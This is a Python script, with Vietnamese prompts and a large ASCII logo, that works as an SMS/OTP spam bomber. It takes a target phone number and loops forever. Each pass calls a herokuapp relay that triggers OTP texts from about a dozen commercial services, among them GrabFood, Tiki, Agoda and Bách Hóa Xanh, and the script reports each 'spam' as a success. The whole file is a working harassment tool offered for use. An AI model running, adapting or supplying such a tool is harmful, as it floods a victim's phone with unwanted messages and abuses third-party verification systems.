from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from calendar import weekheader
from time import sleep
import requests
stt=0
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')  
logo="""

  █████   █    ██  ▄▄▄       ███▄    █   ▄████     ██░ ██  █    ██▓██   ██▓
▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒   ▓██░ ██▒ ██  ▓██▒▒██  ██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░   ▒██▀▀██░▓██  ▒██░ ▒██ ██░
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓   ░▓█ ░██ ▓▓█  ░██░ ░ ▐██▓░
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒   ░▓█▒░██▓▒▒█████▓  ░ ██▒▓░
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒     ▒ ░░▒░▒░▒▓▒ ▒ ▒   ██▒▒▒ 
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░     ▒ ░▒░ ░░░▒░ ░ ░ ▓██ ░▒░ 
   ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░ ░ ░   ░     ░  ░░ ░ ░░░ ░ ░ ▒ ▒ ░░  
    ░       ░           ░  ░         ░       ░     ░  ░  ░   ░     ░ ░     
                                                                   ░ ░     """      
print(Colorate.Diagonal(Colors.green_to_yellow, Center.XCenter(logo)))      
Write.Print('==========================================================================='+'\n' ,Colors.green_to_yellow, interval=0.005)
phone=Write.Input("Nhập SDT: " ,Colors.green_to_yellow, interval=0.005)
Write.Print('==============================BẮT ĐẦU SPAM SMS============================='+'\n' ,Colors.green_to_yellow, interval=0.005) 
while True:
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}')  
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Thế Giới Di Dộng\n" ,Colors.blue_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Nhận Hàng 247\n" ,Colors.green_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Elines\n" ,Colors.yellow_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" MetaVN\n" ,Colors.black_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Bách Hóa Xanh\n" ,Colors.blue_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" GrabFood\n" ,Colors.green_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Tiki\n" ,Colors.yellow_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Go2joy\n" ,Colors.black_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Vntrip\n" ,Colors.blue_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Agoda\n" ,Colors.green_to_red, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    Write.Print(f"NTQH ~> |{stt}| Spam OTP Thành Công Số:"+" "+phone+" Vieon\n" ,Colors.yellow_to_red, interval=0.005)
    for i in range(80, 0):
            print(f"Vui Lòng Đợi {i}\r")
            